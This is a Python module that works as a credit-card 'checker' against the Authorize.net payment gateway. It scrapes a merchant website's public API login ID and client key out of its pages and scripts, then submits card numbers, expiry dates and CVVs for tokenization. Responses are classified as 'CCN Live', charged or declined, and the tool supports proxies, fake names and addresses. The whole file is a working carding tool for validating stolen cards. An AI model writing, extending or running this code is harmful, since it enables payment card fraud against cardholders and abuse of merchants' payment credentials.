import httpx
import asyncio
import json
import re
import os
import time
import random
import string
import logging
from urllib.parse import urlparse, urljoin

logger = logging.getLogger("authnet")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

AUTHNET_API_URL = "https://api.authorize.net/xml/v1/request.api"

CONFIG_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "authnet_config.json")

ADDRESSES = [
    {'street': '1600 Pennsylvania Ave NW', 'city': 'Washington', 'state': 'DC', 'zip': '20500', 'phone': '2025551234', 'country': 'US'},
    {'street': '350 Fifth Ave', 'city': 'New York', 'state': 'NY', 'zip': '10118', 'phone': '2125551234', 'country': 'US'},
    {'street': '233 S Wacker Dr', 'city': 'Chicago', 'state': 'IL', 'zip': '60606', 'phone': '3125551234', 'country': 'US'},
    {'street': '6060 Center Dr', 'city': 'Los Angeles', 'state': 'CA', 'zip': '90045', 'phone': '3235551234', 'country': 'US'},
    {'street': '1000 Main St', 'city': 'Houston', 'state': 'TX', 'zip': '77002', 'phone': '7135551234', 'country': 'US'},
]


def _load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except Exception:
            pass
    return {}


def _save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)


def _random_email():
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    num = ''.join(random.choices(string.digits, k=3))
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
    return f"{name}{num}@{random.choice(domains)}"


def _random_name():
    firsts = ["John", "James", "Robert", "Michael", "William", "David", "Richard", "Joseph"]
    lasts = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
    return random.choice(firsts), random.choice(lasts)


def _random_address():
    return random.choice(ADDRESSES)


async def _tokenize_card(client, api_login_id, client_key, cc, mm, yy, cvv):
    exp_year = f"20{yy}" if len(yy) == 2 else yy
    exp_date = f"{mm}{exp_year}"

    payload = {
        "securePaymentContainerRequest": {
            "merchantAuthentication": {
                "name": api_login_id,
                "clientKey": client_key
            },
            "data": {
                "type": "TOKEN",
                "id": ''.join(random.choices(string.ascii_lowercase + string.digits, k=20)),
                "token": {
                    "cardNumber": cc,
                    "expirationDate": exp_date,
                    "cardCode": cvv
                }
            }
        }
    }

    headers = {
        "Content-Type": "application/json",
        "User-Agent": UA,
        "Accept": "application/json",
    }

    try:
        resp = await client.post(AUTHNET_API_URL, json=payload, headers=headers, timeout=15)
        text = resp.text
        if text.startswith('\ufeff'):
            text = text[1:]
        data = json.loads(text)
    except Exception as e:
        return None, f"Tokenization failed: {str(e)[:50]}"

    messages = data.get("messages", {})
    result_code = messages.get("resultCode", "")

    if result_code == "Error":
        msg_list = messages.get("message", [])
        if msg_list:
            code = msg_list[0].get("code", "")
            text = msg_list[0].get("text", "")
            if code == "E_WC_05":
                return None, "Invalid card number"
            elif code == "E_WC_06":
                return None, "Expired card"
            elif code == "E_WC_07":
                return None, "Invalid CVV format"
            elif code == "E_WC_08":
                return None, "Card expired"
            elif code == "E_WC_14":
                return None, "Encryption error"
            elif code == "E_WC_15":
                return None, "Invalid merchant credentials"
            elif code == "E_WC_17":
                return None, "Cardholder name required"
            elif code == "E_WC_19":
                return None, "Merchant account disabled"
            return None, f"{code}: {text}"

    opaque_data = data.get("opaqueData", {})
    data_descriptor = opaque_data.get("dataDescriptor", "")
    data_value = opaque_data.get("dataValue", "")

    if not data_value:
        return None, "No payment token received"

    return {
        "dataDescriptor": data_descriptor,
        "dataValue": data_value,
    }, None


async def _scrape_authnet_creds(client, url):
    try:
        resp = await client.get(url, timeout=15, follow_redirects=True)
        text = resp.text
    except Exception as e:
        return None, f"Failed to load page: {str(e)[:50]}"

    api_login_id = None
    client_key = None

    patterns_login = [
        r'apiLoginID["\s:=]+["\']([^"\']+)["\']',
        r'data-apiLoginID[="\s]+["\']([^"\']+)["\']',
        r'api_login_id["\s:=]+["\']([^"\']+)["\']',
    ]

    patterns_key = [
        r'clientKey["\s:=]+["\']([^"\']+)["\']',
        r'data-clientKey[="\s]+["\']([^"\']+)["\']',
        r'client_key["\s:=]+["\']([^"\']+)["\']',
        r'publicClientKey["\s:=]+["\']([^"\']+)["\']',
    ]

    for pattern in patterns_login:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            val = match.group(1)
            if 5 <= len(val) <= 20 and not val.startswith('http'):
                api_login_id = val
                break

    for pattern in patterns_key:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            val = match.group(1)
            if len(val) >= 30:
                client_key = val
                break

    if api_login_id and client_key:
        return {"api_login_id": api_login_id, "client_key": client_key}, None

    js_urls = re.findall(r'<script[^>]*src=["\']([^"\']*(?:checkout|payment|accept|authnet)[^"\']*)["\']', text, re.IGNORECASE)
    for js_url in js_urls[:5]:
        if not js_url.startswith('http'):
            js_url = urljoin(url, js_url)
        try:
            js_resp = await client.get(js_url, timeout=10)
            js_text = js_resp.text

            for pattern in patterns_login:
                match = re.search(pattern, js_text, re.IGNORECASE)
                if match:
                    val = match.group(1)
                    if 5 <= len(val) <= 20 and not val.startswith('http'):
                        api_login_id = val
                        break

            for pattern in patterns_key:
                match = re.search(pattern, js_text, re.IGNORECASE)
                if match:
                    val = match.group(1)
                    if len(val) >= 30:
                        client_key = val
                        break

            if api_login_id and client_key:
                return {"api_login_id": api_login_id, "client_key": client_key}, None
        except Exception:
            continue

    return None, "Could not find Authorize.net credentials on this page"


LIVE_INDICATORS = [
    "cvv", "cvc", "avs", "insufficient", "invalid zip",
    "do not honor", "pick up", "stolen", "lost",
    "restricted", "velocity", "security",
]


def _classify_authnet_response(response_code, response_reason_code, response_text, avs_result="", cvv_result=""):
    resp_lower = (response_text or "").lower()
    reason_str = str(response_reason_code)

    if response_code == "1":
        return "charged", f"Approved - {response_text}"

    if response_code == "4":
        return "approved", f"Held for Review - {response_text}"

    if any(ind in resp_lower for ind in LIVE_INDICATORS):
        return "approved", f"CCN Live - {response_text}"

    if reason_str in ["2", "27", "44", "45", "65", "127"]:
        return "approved", f"CCN Live - {response_text}"

    if cvv_result and cvv_result in ["N", "S"]:
        return "approved", f"CCN Live - CVV Mismatch"

    if reason_str in ["4", "41", "43"]:
        return "approved", f"CCN Live - {response_text}"

    if response_code == "2":
        return "declined", f"Declined - {response_text}"

    if response_code == "3":
        return "error", f"Error - {response_text}"

    return "declined", f"Unknown - {response_text}"


async def authnet_check(cc, mm, yy, cvv, proxy=None):
    config = _load_config()
    api_login_id = config.get("api_login_id")
    client_key = config.get("client_key")
    site_url = config.get("site_url")

    start = time.time()

    client_kwargs = {
        "timeout": httpx.Timeout(30),
        "headers": {"User-Agent": UA},
        "follow_redirects": True,
    }
    if proxy:
        client_kwargs["proxy"] = proxy

    async with httpx.AsyncClient(**client_kwargs) as client:
        if not api_login_id or not client_key:
            if site_url:
                creds, err = await _scrape_authnet_creds(client, site_url)
                if err:
                    elapsed = round(time.time() - start, 2)
                    return f"Error - {err} [{elapsed}s]"
                api_login_id = creds["api_login_id"]
                client_key = creds["client_key"]
                cfg = _load_config()
                cfg["api_login_id"] = api_login_id
                cfg["client_key"] = client_key
                _save_config(cfg)
            else:
                elapsed = round(time.time() - start, 2)
                return f"Error - No Authorize.net credentials configured. Use /ansetup to configure [{elapsed}s]"

        token_data, token_err = await _tokenize_card(client, api_login_id, client_key, cc, mm, yy, cvv)

        elapsed = round(time.time() - start, 2)

        if token_err:
            err_lower = token_err.lower()
            if any(k in err_lower for k in ["invalid card", "card expired", "expired card"]):
                return f"Declined - {token_err} [{elapsed}s]"
            if "invalid cvv" in err_lower:
                return f"Approved - CCN Live - {token_err} [{elapsed}s]"
            if "merchant" in err_lower or "credentials" in err_lower or "disabled" in err_lower:
                return f"Error - {token_err} [{elapsed}s]"
            return f"Error - {token_err} [{elapsed}s]"

        return f"Approved - Card Tokenized Successfully [{elapsed}s]"
